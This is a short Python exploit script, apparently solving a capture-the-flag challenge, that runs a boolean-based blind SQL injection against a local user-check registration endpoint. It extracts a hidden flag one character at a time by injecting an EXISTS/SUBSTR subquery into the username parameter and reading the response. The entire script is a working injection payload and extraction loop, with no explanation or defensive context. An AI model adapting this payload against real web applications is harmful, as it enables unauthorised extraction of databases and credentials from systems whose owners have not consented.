#!/bin/python3

import requests
import time
import string

ip = "127.0.0.1"
dictionary = string.ascii_uppercase + string.digits + '{' + '}' + ':'

def main():
	host = f"http://{ip}/register/user-check"
	payload = ""
	flag_index = 1
	final_flag = ""
	while 1:
		for character in dictionary:
			payload = f"username=admin' AND EXISTS(SELECT flag FROM flag WHERE SUBSTR(flag,{flag_index},1) = '{character}');"
			request = requests.get(host, params=payload)
			if ("false" in request.text):
				final_flag = final_flag + character
				print("FOUND CHAR: " + final_flag)
				flag_index += 1
				break
		if len(final_flag) == 43:
			print(f"!!!FINISHED!!!\nFinal_flag: {final_flag}")
			break
if __name__ == '__main__':
	main()
